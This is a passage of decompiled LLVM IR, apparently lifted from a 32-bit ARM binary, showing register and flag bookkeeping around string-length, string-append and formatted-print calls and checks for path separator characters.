  %v2_9a54 = call i32 @function_12cdc(i8* %v1_9a54)
  store i32 %v2_9a54, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9a58 = icmp slt i32 %v2_9a54, 0
  store i1 %v1_9a58, i1* %cpsr_n.global-to-local, align 1
  %v2_9a58 = icmp eq i32 %v2_9a54, 0
  store i1 %v2_9a58, i1* %cpsr_z.global-to-local, align 1
  %tmp239 = icmp slt i32 %v2_9a54, 1
  br i1 %tmp239, label %dec_label_pc_9400, label %dec_label_pc_9a60

dec_label_pc_9a60:                                ; preds = %dec_label_pc_9a30
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9a64 = load i32, i32* %stack_var_-40, align 4
  %v0_9a68 = load i32, i32* @r5, align 4
  %v0_9a6c = load i32, i32* @r4, align 4
  store i32 %v0_9a6c, i32* @r0, align 4
  %v2_9a68 = add i32 %v3_9a64, 1
  %v1_9a70 = add i32 %v2_9a68, %v0_9a68
  store i32 %v1_9a70, i32* %r1.global-to-local, align 4
  %v2_9a74 = inttoptr i32 %v0_9a6c to i8*
  %v3_9a74 = call i32 @function_12d04(i8* %v2_9a74, i32 %v1_9a70)
  store i32 %v3_9a74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9400

dec_label_pc_9a7c:                                ; preds = %dec_label_pc_8dd0
  %v0_9a7c = load i32, i32* @r8, align 4
  %v1_9a7c = add i32 %v0_9a7c, -1456
  %v2_9a7c = inttoptr i32 %v1_9a7c to i32*
  %v3_9a7c = load i32, i32* %v2_9a7c, align 4
  store i32 %v3_9a7c, i32* %r0.global-to-local, align 4
  %v1_9a80 = call i32 @function_1369c(i32 %v3_9a7c)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9a8c = load i32, i32* @r8, align 4
  %v2_9a8c = add i32 %v1_9a8c, -1456
  %v3_9a8c = inttoptr i32 %v2_9a8c to i32*
  store i32 -1, i32* %v3_9a8c, align 4
  %v0_9a90 = load i32, i32* %r3.global-to-local, align 4
  %v1_9a90 = trunc i32 %v0_9a90 to i8
  %v2_9a90 = load i32, i32* @r8, align 4
  %v3_9a90 = add i32 %v2_9a90, -1452
  %v4_9a90 = inttoptr i32 %v3_9a90 to i8*
  store i8 %v1_9a90, i8* %v4_9a90, align 1
  br label %dec_label_pc_8838

dec_label_pc_9a98:                                ; preds = %dec_label_pc_9650
  %v0_9a98 = load i32, i32* @r8, align 4
  %v1_9a98 = add i32 %v0_9a98, -1452
  %v2_9a98 = inttoptr i32 %v1_9a98 to i8*
  %v3_9a98 = load i8, i8* %v2_9a98, align 1
  %v4_9a98 = zext i8 %v3_9a98 to i32
  store i32 %v4_9a98, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9a9c = icmp eq i8 %v3_9a98, 0
  store i1 %v2_9a9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a9c, label %dec_label_pc_8838, label %dec_label_pc_9400

dec_label_pc_9aa8:                                ; preds = %dec_label_pc_98c0
  %v0_9aa8 = load i32, i32* @r4, align 4
  store i32 %v0_9aa8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32), i32* %r1.global-to-local, align 4
  %v3_9ab0 = inttoptr i32 %v0_9aa8 to i8*
  %v4_9ab0 = call i32 @function_130bc(i8* %v3_9ab0, i32 ptrtoint ([4 x i8]* @global_var_15f5c.21 to i32))
  store i32 %v4_9ab0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9ab4 = icmp slt i32 %v4_9ab0, 0
  store i1 %v1_9ab4, i1* %cpsr_n.global-to-local, align 1
  %v2_9ab4 = icmp eq i32 %v4_9ab0, 0
  store i1 %v2_9ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ab4, label %bb240, label %dec_label_pc_98f4

bb240:                                            ; preds = %dec_label_pc_9aa8
  %v0_9abc = load i32, i32* %fp.global-to-local, align 4
  %v1_9abc = load i32, i32* @r5, align 4
  %v2_9abc = sub i32 %v0_9abc, %v1_9abc
  %v3_9abc = icmp uge i32 %v0_9abc, %v1_9abc
  store i1 %v3_9abc, i1* %cpsr_c.global-to-local, align 1
  %v4_9abc = xor i32 %v1_9abc, %v0_9abc
  %v5_9abc = xor i32 %v2_9abc, %v0_9abc
  %v6_9abc = and i32 %v5_9abc, %v4_9abc
  %v7_9abc = icmp slt i32 %v6_9abc, 0
  store i1 %v7_9abc, i1* %cpsr_v.global-to-local, align 1
  %v8_9abc = icmp slt i32 %v2_9abc, 0
  store i1 %v8_9abc, i1* %cpsr_n.global-to-local, align 1
  %v9_9abc = icmp eq i32 %v0_9abc, %v1_9abc
  store i1 %v9_9abc, i1* %cpsr_z.global-to-local, align 1
  %v7_9ac0 = icmp sgt i32 %v0_9abc, %v1_9abc
  %. = select i1 %v7_9ac0, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9ac8 = trunc i32 %. to i8
  %v10_9ac8 = load i32, i32* @r8, align 4
  %v11_9ac8 = add i32 %v10_9ac8, -1452
  %v12_9ac8 = inttoptr i32 %v11_9ac8 to i8*
  store i8 %v9_9ac8, i8* %v12_9ac8, align 1
  br label %dec_label_pc_98fc

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_9adc = load i32, i32* @r8, align 4
  %v1_9adc = add i32 %v0_9adc, 656
  %v2_9adc = inttoptr i32 %v1_9adc to i32*
  %v3_9adc = load i32, i32* %v2_9adc, align 4
  store i32 %v3_9adc, i32* @r4, align 4
  %v3_9ae0 = call i32 @function_122cc(i32 36, i32* null)
  %v0_9ae4 = load i32, i32* @r4, align 4
  store i32 %v0_9ae4, i32* %r1.global-to-local, align 4
  store i32 %v3_9ae0, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9af0 = load i32, i32* @r7, align 4
  store i32 %v0_9af0, i32* %r0.global-to-local, align 4
  %v4_9af4 = call i32 @function_12da0(i32 %v0_9af0, i32 %v0_9ae4, i32 %v3_9ae0, i32 11)
  store i32 %v4_9af4, i32* %r0.global-to-local, align 4
  %v0_9af8 = load i32, i32* @r8, align 4
  %v1_9af8 = add i32 %v0_9af8, 656
  %v2_9af8 = inttoptr i32 %v1_9af8 to i32*
  %v3_9af8 = load i32, i32* %v2_9af8, align 4
  %v0_9afc = load i32, i32* @r7, align 4
  %v2_9afc = add i32 %v0_9afc, %v4_9af4
  store i32 %v2_9afc, i32* @r5, align 4
  store i32 %v4_9af4, i32* @r4, align 4
  %v2_9b04 = sub i32 %v3_9af8, %v4_9af4
  store i32 %v2_9b04, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f98.51 to i32), i32* %r2.global-to-local, align 4
  %v0_9b0c = load i32, i32* @sl, align 4
  store i32 %v0_9b0c, i32* %r3.global-to-local, align 4
  store i32 %v2_9afc, i32* %r0.global-to-local, align 4
  %v4_9b14 = call i32 @function_12da0(i32 %v2_9afc, i32 %v2_9b04, i32 ptrtoint (i32* @global_var_15f98.51 to i32), i32 %v0_9b0c)
  store i32 %v4_9b14, i32* %r0.global-to-local, align 4
  %v0_9b18 = load i32, i32* @r8, align 4
  %v1_9b18 = add i32 %v0_9b18, 12
  %v2_9b18 = inttoptr i32 %v1_9b18 to i32*
  %v3_9b18 = load i32, i32* %v2_9b18, align 4
  store i32 %v3_9b18, i32* %r3.global-to-local, align 4
  %v0_9b1c = load i32, i32* @r4, align 4
  %v2_9b1c = add i32 %v0_9b1c, %v4_9b14
  store i32 %v2_9b1c, i32* %r6.global-to-local, align 4
  %v1_9b20 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b20 = add i32 %v1_9b20, %v2_9b1c
  store i32 %v2_9b20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v1_9b28 = add i32 %v3_9b18, -4
  %v2_9b28 = icmp ugt i32 %v3_9b18, 3
  store i1 %v2_9b28, i1* %cpsr_c.global-to-local, align 1
  %v3_9b28 = sub i32 3, %v3_9b18
  %v4_9b28 = and i32 %v3_9b28, %v3_9b18
  %v5_9b28 = icmp slt i32 %v4_9b28, 0
  store i1 %v5_9b28, i1* %cpsr_v.global-to-local, align 1
  %v6_9b28 = icmp slt i32 %v1_9b28, 0
  store i1 %v6_9b28, i1* %cpsr_n.global-to-local, align 1
  %v7_9b28 = icmp eq i32 %v3_9b18, 4
  store i1 %v7_9b28, i1* %cpsr_z.global-to-local, align 1
  %v3_9b2c = add i32 %v2_9b20, 2115
  %v4_9b2c = inttoptr i32 %v3_9b2c to i8*
  store i8 0, i8* %v4_9b2c, align 1
  %v7_9b30 = icmp sgt i32 %v3_9b18, 4
  br i1 %v7_9b30, label %dec_label_pc_9b34, label %dec_label_pc_9bbc

dec_label_pc_9b34:                                ; preds = %dec_label_pc_9ad4, %dec_label_pc_9bbc, %dec_label_pc_9bcc
  store i32 -1, i32* %r6.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_9b3c = load i32, i32* @r8, align 4
  %v2_9b3c = add i32 %v1_9b3c, 8
  %v3_9b3c = inttoptr i32 %v2_9b3c to i32*
  store i32 -1, i32* %v3_9b3c, align 4
  %v0_9b40 = load i32, i32* %r3.global-to-local, align 4
  %v1_9b40 = trunc i32 %v0_9b40 to i8
  %v2_9b40 = load i32, i32* @r8, align 4
  %v3_9b40 = add i32 %v2_9b40, -1452
  %v4_9b40 = inttoptr i32 %v3_9b40 to i8*
  store i8 %v1_9b40, i8* %v4_9b40, align 1
  br label %dec_label_pc_8838

dec_label_pc_9b48:                                ; preds = %dec_label_pc_99c0, %bb236
  %v2_9b4c = phi i32 [ %v1_99b0, %bb236 ], [ %v2_99d4, %dec_label_pc_99c0 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_9b4c = inttoptr i32 %v2_9b4c to i8*
  store i8 0, i8* %v3_9b4c, align 1
  br label %dec_label_pc_99e8

dec_label_pc_9b54:                                ; preds = %dec_label_pc_93f0
  %v0_9b54 = load i32, i32* %sb.global-to-local, align 4
  %v1_9b58 = add i32 %v0_9b54, 533
  store i32 %v1_9b58, i32* @r4, align 4
  store i32 %v1_9b58, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9b64 = call i32 @function_12d7c(i32 %v1_9b58, i32 255)
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v3_9b6c = load i32, i32* %stack_var_-40, align 4
  %v0_9b70 = load i32, i32* @r5, align 4
  %v2_9b70 = add i32 %v3_9b6c, 1
  %v1_9b74 = add i32 %v2_9b70, %v0_9b70
  store i32 %v1_9b74, i32* %r0.global-to-local, align 4
  %v1_9b78 = inttoptr i32 %v1_9b74 to i8*
  %v2_9b78 = call i32 @function_12cdc(i8* %v1_9b78)
  store i32 %v2_9b78, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9b7c = icmp slt i32 %v2_9b78, 0
  store i1 %v1_9b7c, i1* %cpsr_n.global-to-local, align 1
  %v2_9b7c = icmp eq i32 %v2_9b78, 0
  store i1 %v2_9b7c, i1* %cpsr_z.global-to-local, align 1
  %tmp241 = icmp slt i32 %v2_9b78, 1
  br i1 %tmp241, label %dec_label_pc_9400, label %dec_label_pc_9b84

dec_label_pc_9b84:                                ; preds = %dec_label_pc_9b54
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9b88 = load i32, i32* %stack_var_-40, align 4
  %v0_9b8c = load i32, i32* @r5, align 4
  %v2_9b8c = add i32 %v3_9b88, 1
  %v1_9b90 = add i32 %v2_9b8c, %v0_9b8c
  store i32 %v1_9b90, i32* %r0.global-to-local, align 4
  %v1_9b94 = inttoptr i32 %v1_9b90 to i8*
  %v2_9b94 = call i32 @function_12cdc(i8* %v1_9b94)
  store i32 %v2_9b94, i32* %r0.global-to-local, align 4
  %v1_9b98 = add i32 %v2_9b94, -255
  %v2_9b98 = icmp ugt i32 %v2_9b94, 254
  store i1 %v2_9b98, i1* %cpsr_c.global-to-local, align 1
  %v3_9b98 = sub i32 254, %v2_9b94
  %v4_9b98 = and i32 %v3_9b98, %v2_9b94
  %v5_9b98 = icmp slt i32 %v4_9b98, 0
  store i1 %v5_9b98, i1* %cpsr_v.global-to-local, align 1
  %v6_9b98 = icmp slt i32 %v1_9b98, 0
  store i1 %v6_9b98, i1* %cpsr_n.global-to-local, align 1
  %v7_9b98 = icmp eq i32 %v2_9b94, 255
  store i1 %v7_9b98, i1* %cpsr_z.global-to-local, align 1
  %v8_9b9c = icmp sgt i32 %v2_9b94, 255
  br i1 %v8_9b9c, label %dec_label_pc_9400, label %dec_label_pc_9ba0

dec_label_pc_9ba0:                                ; preds = %dec_label_pc_9b84
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9ba4 = load i32, i32* %stack_var_-40, align 4
  %v0_9ba8 = load i32, i32* @r5, align 4
  %v0_9bac = load i32, i32* @r4, align 4
  store i32 %v0_9bac, i32* @r0, align 4
  %v2_9ba8 = add i32 %v3_9ba4, 1
  %v1_9bb0 = add i32 %v2_9ba8, %v0_9ba8
  store i32 %v1_9bb0, i32* %r1.global-to-local, align 4
  %v2_9bb4 = inttoptr i32 %v0_9bac to i8*
  %v3_9bb4 = call i32 @function_12d04(i8* %v2_9bb4, i32 %v1_9bb0)
  store i32 %v3_9bb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9400

dec_label_pc_9bbc:                                ; preds = %dec_label_pc_9ad4
  %v0_9bbc = load i32, i32* @r5, align 4
  store i32 %v0_9bbc, i32* %r0.global-to-local, align 4
  %v1_9bc0 = inttoptr i32 %v0_9bbc to i8*
  %v2_9bc0 = call i32 @function_12cdc(i8* %v1_9bc0)
  store i32 %v2_9bc0, i32* %r0.global-to-local, align 4
  %v1_9bc4 = add i32 %v2_9bc0, -127
  %v2_9bc4 = icmp ugt i32 %v2_9bc0, 126
  store i1 %v2_9bc4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bc4 = sub i32 126, %v2_9bc0
  %v4_9bc4 = and i32 %v3_9bc4, %v2_9bc0
  %v5_9bc4 = icmp slt i32 %v4_9bc4, 0
  store i1 %v5_9bc4, i1* %cpsr_v.global-to-local, align 1
  %v6_9bc4 = icmp slt i32 %v1_9bc4, 0
  store i1 %v6_9bc4, i1* %cpsr_n.global-to-local, align 1
  %v7_9bc4 = icmp eq i32 %v2_9bc0, 127
  store i1 %v7_9bc4, i1* %cpsr_z.global-to-local, align 1
  %v8_9bc8 = icmp sgt i32 %v2_9bc0, 127
  br i1 %v8_9bc8, label %dec_label_pc_9b34, label %dec_label_pc_9bcc

dec_label_pc_9bcc:                                ; preds = %dec_label_pc_9bbc
  %v0_9bcc = load i32, i32* @r8, align 4
  %v1_9bcc = add i32 %v0_9bcc, 12
  %v2_9bcc = inttoptr i32 %v1_9bcc to i32*
  %v3_9bcc = load i32, i32* %v2_9bcc, align 4
  store i32 %v1_9410, i32* %r2.global-to-local, align 4
  %v1_9bd4 = and i32 %v3_9bcc, 33554432
  %v2_9bd4 = icmp ne i32 %v1_9bd4, 0
  store i1 %v2_9bd4, i1* %cpsr_c.global-to-local, align 1
  %v3_9bd4 = mul i32 %v3_9bcc, 128
  %v0_9bd8 = load i32, i32* @r5, align 4
  store i32 %v0_9bd8, i32* %r1.global-to-local, align 4
  %v2_9bdc = add i32 %v3_9bd4, %v1_9410
  store i32 %v2_9bdc, i32* @r0, align 4
  %v2_9be0 = inttoptr i32 %v2_9bdc to i8*
  %v3_9be0 = call i32 @function_12d04(i8* %v2_9be0, i32 %v0_9bd8)
  store i32 %v3_9be0, i32* %r0.global-to-local, align 4
  %v0_9be4 = load i32, i32* @r8, align 4
  %v1_9be4 = add i32 %v0_9be4, 12
  %v2_9be4 = inttoptr i32 %v1_9be4 to i32*
  %v3_9be4 = load i32, i32* %v2_9be4, align 4
  store i32 %v1_9410, i32* %r3.global-to-local, align 4
  %v1_9bec = and i32 %v3_9be4, 33554432
  %v2_9bec = icmp ne i32 %v1_9bec, 0
  store i1 %v2_9bec, i1* %cpsr_c.global-to-local, align 1
  %v3_9bec = mul i32 %v3_9be4, 128
  %v2_9bf0 = add i32 %v3_9bec, %v1_9410
  store i32 %v2_9bf0, i32* %r4.global-to-local, align 4
  store i32 %v2_9bf0, i32* %r0.global-to-local, align 4
  %v1_9bf8 = inttoptr i32 %v2_9bf0 to i8*
  %v2_9bf8 = call i32 @function_12cdc(i8* %v1_9bf8)
  store i32 ptrtoint (i32* @global_var_15f9c.53 to i32), i32* %r1.global-to-local, align 4
  %v2_9c00 = add i32 %v2_9bf0, %v2_9bf8
  store i32 %v2_9c00, i32* @r0, align 4
  %v2_9c04 = inttoptr i32 %v2_9c00 to i8*
  %v3_9c04 = call i32 @function_12d04(i8* %v2_9c04, i32 ptrtoint (i32* @global_var_15f9c.53 to i32))
  store i32 %v3_9c04, i32* %r0.global-to-local, align 4
  %v0_9c08 = load i32, i32* %r6.global-to-local, align 4
  %v1_9c08 = add i32 %v0_9c08, 3
  store i32 %v1_9c08, i32* @r4, align 4
  %v0_9c0c = load i32, i32* @r8, align 4
  %v1_9c0c = add i32 %v0_9c0c, 656
  %v2_9c0c = inttoptr i32 %v1_9c0c to i32*
  %v3_9c0c = load i32, i32* %v2_9c0c, align 4
  %v0_9c10 = load i32, i32* @r7, align 4
  %v2_9c10 = add i32 %v0_9c10, %v1_9c08
  store i32 %v2_9c10, i32* %r6.global-to-local, align 4
  %v2_9c14 = sub i32 %v3_9c0c, %v1_9c08
  store i32 %v2_9c14, i32* %r1.global-to-local, align 4
  %v0_9c18 = load i32, i32* @sl, align 4
  store i32 %v0_9c18, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f98.51 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9c10, i32* %r0.global-to-local, align 4
  %v4_9c24 = call i32 @function_12da0(i32 %v2_9c10, i32 %v2_9c14, i32 ptrtoint (i32* @global_var_15f98.51 to i32), i32 %v0_9c18)
  store i32 %v4_9c24, i32* %r0.global-to-local, align 4
  %v0_9c28 = load i32, i32* @r8, align 4
  %v1_9c28 = add i32 %v0_9c28, 12
  %v2_9c28 = inttoptr i32 %v1_9c28 to i32*
  %v3_9c28 = load i32, i32* %v2_9c28, align 4
  store i32 %v1_9410, i32* %ip.global-to-local, align 4
  %v1_9c30 = and i32 %v3_9c28, 33554432
  %v2_9c30 = icmp ne i32 %v1_9c30, 0
  store i1 %v2_9c30, i1* %cpsr_c.global-to-local, align 1
  %v3_9c30 = mul i32 %v3_9c28, 128
  %v0_9c34 = load i32, i32* @r4, align 4
  %v1_9c34 = load i32, i32* %sb.global-to-local, align 4
  %v2_9c38 = add i32 %v3_9c30, %v1_9410
  store i32 %v2_9c38, i32* @r5, align 4
  %v2_9c34 = add i32 %v0_9c34, %v4_9c24
  %v2_9c3c = add i32 %v2_9c34, %v1_9c34
  store i32 %v2_9c3c, i32* @r4, align 4
  %v0_9c40 = load i32, i32* %fp.global-to-local, align 4
  %v1_9c40 = trunc i32 %v0_9c40 to i8
  %v3_9c40 = add i32 %v2_9c3c, 2115
  %v4_9c40 = inttoptr i32 %v3_9c40 to i8*
  store i8 %v1_9c40, i8* %v4_9c40, align 1
  %v0_9c44 = load i32, i32* @r5, align 4
  store i32 %v0_9c44, i32* %r0.global-to-local, align 4
  %v1_9c48 = inttoptr i32 %v0_9c44 to i8*
  %v2_9c48 = call i32 @function_12cdc(i8* %v1_9c48)
  %v0_9c4c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_9c4c, i32* %r1.global-to-local, align 4
  %v0_9c50 = load i32, i32* @r5, align 4
  %v2_9c50 = add i32 %v0_9c50, %v2_9c48
  store i32 %v2_9c50, i32* @r0, align 4
  %v2_9c54 = inttoptr i32 %v2_9c50 to i8*
  %v3_9c54 = call i32 @function_12d04(i8* %v2_9c54, i32 %v0_9c4c)
  store i32 %v3_9c54, i32* %r0.global-to-local, align 4
  %v0_9c58 = load i32, i32* @r8, align 4
  %v1_9c58 = add i32 %v0_9c58, 12
  %v2_9c58 = inttoptr i32 %v1_9c58 to i32*
  %v3_9c58 = load i32, i32* %v2_9c58, align 4
  %v1_9c5c = add i32 %v3_9c58, 1
  store i32 %v1_9c5c, i32* %r3.global-to-local, align 4
  store i32 %v1_9c5c, i32* %v2_9c58, align 4
  br label %dec_label_pc_9b34

dec_label_pc_9c68:                                ; preds = %dec_label_pc_984c
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_9c74 = load i32, i32* @r5, align 4
  %v1_9c74 = add i32 %v0_9c74, 4
  %v2_9c74 = inttoptr i32 %v1_9c74 to i8*
  %v3_9c74 = load i8, i8* %v2_9c74, align 1
  %v4_9c74 = zext i8 %v3_9c74 to i32
  store i32 %v4_9c74, i32* %r3.global-to-local, align 4
  %v2_9c78 = icmp ugt i8 %v3_9c74, 114
  store i1 %v2_9c78, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9c78 = icmp ult i8 %v3_9c74, 115
  store i1 %v6_9c78, i1* %cpsr_n.global-to-local, align 1
  %v7_9c78 = icmp eq i8 %v3_9c74, 115
  store i1 %v7_9c78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9c78, label %bb242, label %.thread69

bb242:                                            ; preds = %dec_label_pc_9c68
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread69

.thread69:                                        ; preds = %dec_label_pc_9c68, %bb242
  %v3_9c88 = phi i32 [ 7, %dec_label_pc_9c68 ], [ 8, %bb242 ]
  %v0_9c8c = load i32, i32* @r7, align 4
  %v1_9c8c = sub nsw i32 1, %v3_9c88
  %v2_9c90 = add i32 %v1_9c8c, %v0_9c8c
  store i32 %v2_9c90, i32* @r2, align 4
  store i32 %v0_9c74, i32* @r0, align 4
  %v2_9c98 = add i32 %v3_9c88, %v0_9c74
  store i32 %v2_9c98, i32* @r1, align 4
  %v3_9c9c = call i32 @function_13cc0(i32 %v0_9c74, i32 %v2_9c98, i32 %v2_9c90)
  store i32 %v3_9c9c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v0_9cac = load i32, i32* @r6, align 4
  %v1_9cac = load i32, i32* @r4, align 4
  %v2_9cac = add i32 %v1_9cac, %v0_9cac
  %v3_9cac = inttoptr i32 %v2_9cac to i8*
  %v4_9cac = load i8, i8* %v3_9cac, align 1
  %v6_9cac = zext i8 %v4_9cac to i32
  store i32 %v6_9cac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v9_9cb0 = icmp eq i8 %v4_9cac, 0
  store i1 %v9_9cb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9cb0, label %dec_label_pc_9cf0, label %dec_label_pc_9cb8

dec_label_pc_9cb8:                                ; preds = %.thread69
  %v2_9cb8 = icmp ugt i8 %v4_9cac, 46
  store i1 %v2_9cb8, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9cb8 = icmp ult i8 %v4_9cac, 47
  store i1 %v6_9cb8, i1* %cpsr_n.global-to-local, align 1
  %v7_9cb8 = icmp eq i8 %v4_9cac, 47
  store i1 %v7_9cb8, i1* %cpsr_z.global-to-local, align 1
  %v1_9cbc = load i32, i32* @r5, align 4
  br i1 %v7_9cb8, label %bb243, label %dec_label_pc_9cc4

bb243:                                            ; preds = %dec_label_pc_9cb8
  store i32 %v1_9cbc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9dd4

dec_label_pc_9cc4:                                ; preds = %dec_label_pc_9cb8
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_9cd4

dec_label_pc_9ccc:                                ; preds = %dec_label_pc_9cd4
  %v2_9ccc = icmp ugt i8 %v4_9cdc, 46
  store i1 %v2_9ccc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9ccc = icmp ult i8 %v4_9cdc, 47
  store i1 %v6_9ccc, i1* %cpsr_n.global-to-local, align 1
  %v7_9ccc = icmp eq i8 %v4_9cdc, 47
  store i1 %v7_9ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9ccc, label %dec_label_pc_9dd4, label %dec_label_pc_9cd4

dec_label_pc_9cd4:                                ; preds = %dec_label_pc_9ccc, %dec_label_pc_9cc4
  %v1_9ce4 = phi i32 [ %v1_9ce8, %dec_label_pc_9ccc ], [ 1, %dec_label_pc_9cc4 ]
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v1_9ce4, i32* %stack_var_-40, align 4
  %v2_9cdc = add i32 %v1_9ce4, %v1_9cbc
  %v3_9cdc = inttoptr i32 %v2_9cdc to i8*
  %v4_9cdc = load i8, i8* %v3_9cdc, align 1
  %v6_9cdc = zext i8 %v4_9cdc to i32
  store i32 %v6_9cdc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_9ce0 = icmp eq i8 %v4_9cdc, 0
  store i1 %v2_9ce0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_9cdc, i32* %r1.global-to-local, align 4
  %v1_9ce8 = add i32 %v1_9ce4, 1
  store i32 %v1_9ce8, i32* %r3.global-to-local, align 4
  br i1 %v2_9ce0, label %dec_label_pc_9cf0, label %dec_label_pc_9ccc

dec_label_pc_9cf0:                                ; preds = %dec_label_pc_9cd4, %.thread69, %dec_label_pc_9dd4
  %v0_9cf0 = load i32, i32* @r5, align 4
  store i32 %v0_9cf0, i32* %r0.global-to-local, align 4
  %v1_9cf4 = inttoptr i32 %v0_9cf0 to i8*
  %v2_9cf4 = call i32 @function_12cdc(i8* %v1_9cf4)
  store i32 %v2_9cf4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9cf8 = icmp slt i32 %v2_9cf4, 0
  store i1 %v1_9cf8, i1* %cpsr_n.global-to-local, align 1
  %v2_9cf8 = icmp eq i32 %v2_9cf4, 0
  store i1 %v2_9cf8, i1* %cpsr_z.global-to-local, align 1
  %tmp244 = icmp slt i32 %v2_9cf4, 1
  br i1 %tmp244, label %dec_label_pc_9d1c, label %dec_label_pc_9d00

dec_label_pc_9d00:                                ; preds = %dec_label_pc_9cf0
  %v0_9d00 = load i32, i32* @r5, align 4
  store i32 %v0_9d00, i32* %r0.global-to-local, align 4
  %v1_9d04 = inttoptr i32 %v0_9d00 to i8*
  %v2_9d04 = call i32 @function_12cdc(i8* %v1_9d04)
  store i32 %v2_9d04, i32* %r0.global-to-local, align 4
  %v1_9d08 = add i32 %v2_9d04, -127
  %v2_9d08 = icmp ugt i32 %v2_9d04, 126
  store i1 %v2_9d08, i1* %cpsr_c.global-to-local, align 1
  %v3_9d08 = sub i32 126, %v2_9d04
  %v4_9d08 = and i32 %v3_9d08, %v2_9d04
  %v5_9d08 = icmp slt i32 %v4_9d08, 0
  store i1 %v5_9d08, i1* %cpsr_v.global-to-local, align 1
  %v6_9d08 = icmp slt i32 %v1_9d08, 0
  store i1 %v6_9d08, i1* %cpsr_n.global-to-local, align 1
  %v7_9d08 = icmp eq i32 %v2_9d04, 127
  store i1 %v7_9d08, i1* %cpsr_z.global-to-local, align 1
  %v7_9d0c = icmp sgt i32 %v2_9d04, 127
  br i1 %v7_9d0c, label %.thread72, label %bb245

bb245:                                            ; preds = %dec_label_pc_9d00
  %v8_9d0c = load i32, i32* %sb.global-to-local, align 4
  %v9_9d10 = add i32 %v8_9d0c, 789
  store i32 %v9_9d10, i32* %r0.global-to-local, align 4
  %v8_9d14 = load i32, i32* @r5, align 4
  store i32 %v8_9d14, i32* %r1.global-to-local, align 4
  br label %.thread72

.thread72:                                        ; preds = %dec_label_pc_9d00, %bb245
  store i32 40220, i32* @lr, align 4
  %v3_9d18 = xor i1 %v6_9d08, %v5_9d08
  %v4_9d18 = or i1 %v7_9d08, %v3_9d18
  call void @__pseudo_cond_branch(i1 %v4_9d18, i32 ptrtoint (i32* @global_var_12d04.49 to i32))
  br label %dec_label_pc_9d1c

dec_label_pc_9d1c:                                ; preds = %dec_label_pc_9cf0, %.thread72
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9d20 = load i32, i32* %stack_var_-40, align 4
  %v0_9d24 = load i32, i32* @r5, align 4
  %v2_9d24 = add i32 %v3_9d20, 1
  %v1_9d28 = add i32 %v2_9d24, %v0_9d24
  store i32 %v1_9d28, i32* %r0.global-to-local, align 4
